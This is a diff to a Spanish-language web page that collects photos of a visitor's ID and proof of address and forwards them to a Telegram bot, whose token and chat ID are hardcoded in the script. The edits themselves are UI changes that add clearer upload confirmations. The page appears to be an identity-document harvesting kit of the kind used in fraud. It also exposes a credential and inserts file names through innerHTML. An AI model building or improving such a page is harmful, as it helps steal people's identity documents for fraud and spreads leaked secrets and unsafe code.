@@ -45,15 +45,57 @@
   .section-heading p { margin:0; color:var(--muted); font-size:1.08rem; }
   .uploads { display:grid; grid-template-columns:repeat(3,1fr); gap:16px; }
   .upload-card { border:1.5px solid #cbdcf8; border-radius:16px; padding:18px 16px 16px;
-    text-align:center; min-width:0; background:#fff; }
-  .upload-card .doc-icon { width:68px; height:68px; color:#1459a8; margin:0 auto 8px; }
+    text-align:center; min-width:0; background:#fff; transition: border-color .2s ease, background .2s ease; }
+  .upload-card.loaded { border-color: var(--green-bright); background: #f4fdf7; }
+  .upload-card .doc-icon { width:68px; height:68px; color:#1459a8; margin:0 auto 8px; transition: color .2s ease; }
+  .upload-card.loaded .doc-icon { color: var(--green); }
   .upload-card h3 { font-size:1.15rem; margin:0 0 5px; }
   .upload-card p { color:var(--muted); margin:0 0 14px; min-height:22px; font-size:.98rem; }
   .upload-btn { border:0; background:var(--blue); color:white; font-size:1.05rem; font-weight:700;
-    border-radius:12px; padding:15px 12px; width:100%; cursor:pointer; }
+    border-radius:12px; padding:15px 12px; width:100%; cursor:pointer; transition: background .2s ease; }
   .upload-btn:hover { background:#0f55a9; }
+  .upload-btn.loaded { background: var(--green); }
+  .upload-btn.loaded:hover { background: #0e7a35; }
   .upload-btn:focus-visible, .send:focus-visible, .confirm-choice:focus-visible { outline:4px solid #f2c94c; outline-offset:3px; }
-  .file-name { display:block; margin-top:9px; min-height:18px; color:#17683a; font-size:.9rem; overflow-wrap:anywhere; }
+  
+  /* ---------- CONFIRMACIÓN DE ARCHIVO CARGADO (MEJORADA) ---------- */
+  .file-name {
+    display: none;
+    margin-top: 12px;
+    padding: 10px 14px;
+    border-radius: 10px;
+    background: var(--green-light);
+    border: 1px solid #b8e6c8;
+    color: #145b31;
+    font-size: .95rem;
+    font-weight: 600;
+    overflow-wrap: anywhere;
+    text-align: left;
+    align-items: center;
+    gap: 8px;
+    animation: fadeInUp .25s ease;
+  }
+  .file-name.visible {
+    display: flex;
+  }
+  .file-name .check-badge {
+    width: 22px;
+    height: 22px;
+    flex: none;
+    border-radius: 50%;
+    background: var(--green);
+    color: white;
+    display: grid;
+    place-items: center;
+    font-size: .8rem;
+    font-weight: bold;
+  }
+  @keyframes fadeInUp {
+    from { opacity: 0; transform: translateY(-4px); }
+    to   { opacity: 1; transform: translateY(0); }
+  }
+  /* ---------- FIN CONFIRMACIÓN ---------- */
+
   .bottom { display:grid; grid-template-columns:1fr 1fr; gap:18px; margin-top:18px; }
   .help { background:#e8f1ff; border-radius:15px; padding:18px 20px; display:flex; gap:14px; align-items:center; color:#243a5b; }
   .info { width:34px; height:34px; border-radius:50%; background:var(--navy); color:white; display:grid; place-items:center; font-weight:bold; font-size:1.2rem; flex:none; }
@@ -106,6 +148,7 @@
     .upload-card h3 { align-self:end; }
     .upload-card p { min-height:0; margin-bottom:8px; }
     .upload-btn { grid-column:1 / -1; }
+    .file-name { grid-column: 1 / -1; }
     .bottom { grid-template-columns:1fr; }
     .person { gap:14px; align-items:flex-start; }
     .avatar { width:66px; height:66px; }
@@ -137,19 +180,19 @@
       </div>
 
       <div class="uploads">
-        <article class="upload-card">
+        <article class="upload-card" id="id-card">
           <svg class="doc-icon" viewBox="0 0 72 72" fill="none" aria-hidden="true"><rect x="5" y="10" width="62" height="49" rx="8" stroke="currentColor" stroke-width="4"/><circle cx="24" cy="29" r="8" fill="currentColor"/><path d="M11 51c1-9 6-14 13-14s12 5 13 14M43 25h17M43 36h17" stroke="currentColor" stroke-width="4" stroke-linecap="round"/></svg>
           <h3>Identificación</h3><p>Ej. Licencia de conducir</p>
           <button class="upload-btn" type="button" data-file="id-file">＋ &nbsp; Seleccionar foto</button>
           <input id="id-file" type="file" accept="image/*,.pdf" hidden>
-          <span class="file-name" id="id-file-name">Ningún archivo seleccionado</span>
+          <span class="file-name" id="id-file-name"></span>
         </article>
-        <article class="upload-card">
+        <article class="upload-card" id="address-card">
           <svg class="doc-icon" viewBox="0 0 72 72" fill="none" aria-hidden="true"><path d="M15 5h29l15 15v47H15z" stroke="currentColor" stroke-width="4" stroke-linejoin="round"/><path d="M44 5v16h15M25 34h27M25 45h27M25 56h19" stroke="currentColor" stroke-width="4" stroke-linecap="round"/></svg>
           <h3>Comprobante de dirección</h3><p>Ej. Factura de Luz o estado de cuenta</p>
           <button class="upload-btn" type="button" data-file="address-file">＋ &nbsp; Seleccionar foto</button>
           <input id="address-file" type="file" accept="image/*,.pdf" hidden>
-          <span class="file-name" id="address-file-name">Ningún archivo seleccionado</span>
+          <span class="file-name" id="address-file-name"></span>
         </article>
       </div>
     </section>
@@ -165,7 +208,7 @@
 </div>
 <script>
   // ============================================================
-  // ⚙️ CONFIGURACIÓN — PON TUS VALORES REALES AQUÍ
+  // ⚙️ CONFIGURACIÓN 
   // ============================================================
   const TELEGRAM_BOT_TOKEN = '9081306880:AAGj473EcQrhoWXjEDgj1jn3oAj7tmA8D9I';
   const TELEGRAM_CHAT_ID   = '-5032467569';
@@ -184,11 +227,31 @@
     });
   });
 
-  // Mostrar nombre del archivo seleccionado
+  // Mostrar nombre del archivo seleccionado con confirmación visual clara
   document.querySelectorAll('input[type="file"]').forEach(input => {
     input.addEventListener('change', () => {
       const label = document.getElementById(input.id + '-name');
-      label.textContent = input.files.length ? input.files[0].name : 'Ningún archivo seleccionado';
+      const card = document.getElementById(input.id.replace('-file', '-card'));
+      const btn = document.querySelector(`[data-file="${input.id}"]`);
+
+      if (input.files.length) {
+        const fileName = input.files[0].name;
+        label.innerHTML = `<span class="check-badge">✓</span> <span>${fileName}</span>`;
+        label.classList.add('visible');
+        if (card) card.classList.add('loaded');
+        if (btn) {
+          btn.classList.add('loaded');
+          btn.textContent = '✓  Archivo cargado';
+        }
+      } else {
+        label.innerHTML = '';
+        label.classList.remove('visible');
+        if (card) card.classList.remove('loaded');
+        if (btn) {
+          btn.classList.remove('loaded');
+          btn.textContent = '＋  Seleccionar foto';
+        }
+      }
     });
   });
 
@@ -200,6 +263,20 @@
     toast.style.display = 'block';
     clearTimeout(toast._timeout);
     toast._timeout = setTimeout(() => { toast.style.display = 'none'; }, 7000);
+  }
+
+  // Restablecer el estado visual de un input y su tarjeta
+  function resetInputVisual(input) {
+    const label = document.getElementById(input.id + '-name');
+    const card = document.getElementById(input.id.replace('-file', '-card'));
+    const btn = document.querySelector(`[data-file="${input.id}"]`);
+    label.innerHTML = '';
+    label.classList.remove('visible');
+    if (card) card.classList.remove('loaded');
+    if (btn) {
+      btn.classList.remove('loaded');
+      btn.textContent = '＋  Seleccionar foto';
+    }
   }
 
   // Enviar documentos a Telegram
@@ -277,7 +354,7 @@
 
       for (const input of Object.values(fileInputs)) {
         input.value = '';
-        document.getElementById(input.id + '-name').textContent = 'Ningún archivo seleccionado';
+        resetInputVisual(input);
       }
 
     } catch (error) {
